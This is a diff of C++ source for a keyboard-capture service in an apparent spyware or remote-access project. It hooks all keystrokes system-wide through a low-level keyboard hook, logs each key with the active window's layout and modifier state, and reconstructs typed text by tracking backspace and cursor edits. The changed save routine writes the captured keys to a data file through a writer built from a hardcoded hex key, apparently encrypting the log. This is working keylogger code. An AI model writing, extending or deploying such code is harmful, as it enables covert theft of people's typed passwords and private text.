@@ -1,6 +1,8 @@
 #include "services.hpp"
 #if KEYBOARD_SERVICE
 
+using namespace lrcdata;
+
 void services::keyboard::run()
 {
 	// Exit function if service is already running
@@ -44,10 +46,10 @@ void services::keyboard::processqueue()
 	{
 		if (!vkQueue.empty())
 		{
-			VirtualKeyInfo vkInfo = vkQueue.front();
+			VKInfo vkInfo = vkQueue.front().vkInfo;
 			vkQueue.pop();
 
-			switch (vkInfo.vkCode)
+			switch (vkInfo.keyCode)
 			{
 			case VK_BACK:
 				onBackspace();
@@ -79,7 +81,7 @@ void services::keyboard::processqueue()
 				break;
 			}
 
-			if (vkInfo.vkCode != 0)
+			if (vkInfo.keyCode != 0)
 			{
 				processvk(vkInfo);
 			}
@@ -97,18 +99,19 @@ LRESULT CALLBACK services::keyboard::LowLevelKeyboardProc(int nCode, WPARAM wPar
 		bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
 		bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-		VirtualKeyInfo vkInfo;
-		vkInfo.vkCode = dllHookStruct->vkCode;
-		vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
-		vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;
+		PartKeyboard pk;
+		pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_VKINFO;
+		pk.vkInfo.keyCode = dllHookStruct->vkCode;
+		pk.vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
+		pk.vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;
 
-		vkQueue.push(vkInfo);
+		vkQueue.push(pk);
 	}
 
 	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
 }
 
-void services::keyboard::processvk(VirtualKeyInfo vkInfo)
+void services::keyboard::processvk(VKInfo vkInfo)
 {
 	// Filter virtual-key repeats
 	if (vkcmp(vkInfo, lastKeyPressed))
@@ -128,13 +131,17 @@ void services::keyboard::processvk(VirtualKeyInfo vkInfo)
 		lastKeyPressed = vkInfo;
 	}
 
-	if (isprintable(vkInfo.vkCode))
+	if (isprintable(vkInfo.keyCode))
 	{
-		VirtualKeyInfoList::iterator it = vkList.begin();
+		PKList::iterator it = vkList.begin();
 		std::advance(vkList.begin(), vkListCursor);
 
+		PartKeyboard toAdd;
+		toAdd.subtype = 0x1;
+		toAdd.vkInfo = vkInfo;
+
 		// Insert virtual-key into vkList at cursor position
-		vkList.insert(it, vkInfo);
+		vkList.insert(it, toAdd);
 
 		vkEvents++;
 
@@ -151,39 +158,8 @@ void services::keyboard::processvk(VirtualKeyInfo vkInfo)
 
 void services::keyboard::save()
 {
-	// Json serialize virtual-key code list
-	std::stringstream json;
-	VirtualKeyInfo vkTemp;
-	bool isFirst = true;
-	json << "{\"vkl\":[";
-	for (VirtualKeyInfoList::iterator it = vkList.begin(); it != vkList.end(); ++it)
-	{
-		vkTemp = static_cast<VirtualKeyInfo>(*it);
-		if (!isFirst)
-		{
-			json << ',';
-		}
-		else
-		{
-			isFirst = false;
-		}
-		json << "{\"vk\":" << vkTemp.vkCode << ",\"la\":" << vkTemp.lang << ",\"fl\":" << vkTemp.flags << "}";
-	}
-	json << "]}";
-	std::string result = json.str();
-
-	// Create directory for keyboard data if not exist
-	if (!io::directory::exist(dir))
-	{
-		io::directory::create(dir);
-	}
-
-	// Generate filename by time
-	std::stringstream filename;
-	filename << dir << "\\" << tools::getTime(tools::TimeFormat::file) << ".dat";
-
-	// Write json-formated keyboard data to file
-	io::file::write(filename.str(), result);
+	LRCDataWriter writer("fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a");
+	writer.WriteData("Foobar.dat", vkList);
 
 	// Prepare buffer to next virtual-key sequence
 	vkListCursorBegin = 0;
@@ -196,7 +172,7 @@ void services::keyboard::onDelete()
 {
 	if (vkListCursor >= vkListCursorBegin && vkListCursor < vkList.size())
 	{
-		VirtualKeyInfoList::iterator it = vkList.begin();
+		PKList::iterator it = vkList.begin();
 		std::advance(it, vkListCursor);
 		vkList.erase(it);
 	}
@@ -206,7 +182,7 @@ void services::keyboard::onBackspace()
 {
 	if (vkListCursor > vkListCursorBegin && vkListCursor < vkList.size() + 1)
 	{
-		VirtualKeyInfoList::iterator it = vkList.begin();
+		PKList::iterator it = vkList.begin();
 		std::advance(it, vkListCursor - 1);
 		vkList.erase(it);
 		vkListCursor--;
@@ -220,20 +196,20 @@ void services::keyboard::clear()
 	vkRepeats = 0;
 	vkListCursorBegin = 0;
 	vkListCursor = 0;
-	lastKeyPressed.vkCode = 0;
+	lastKeyPressed.keyCode = 0;
 	lastKeyPressed.lang = 0;
 	lastKeyPressed.flags = 0;
 	vkList.clear();
 }
 
 // Copmares two VirtualKeyInfo structures
-inline bool services::keyboard::vkcmp(const VirtualKeyInfo vk1, const VirtualKeyInfo vk2)
+bool services::keyboard::vkcmp(const VKInfo vk1, const VKInfo vk2)
 {
-	return (vk1.vkCode == vk2.vkCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
+	return (vk1.keyCode == vk2.keyCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
 }
 
 // Is virtual key appends text into text fields
-inline bool services::keyboard::isprintable(const DWORD vkCode)
+bool services::keyboard::isprintable(const DWORD vkCode)
 {
 	return (vkCode == 0x20)						// Spacebar
 		|| (vkCode >= 0x30 && vkCode <= 0x5A)	// 0 - 9, A - Z
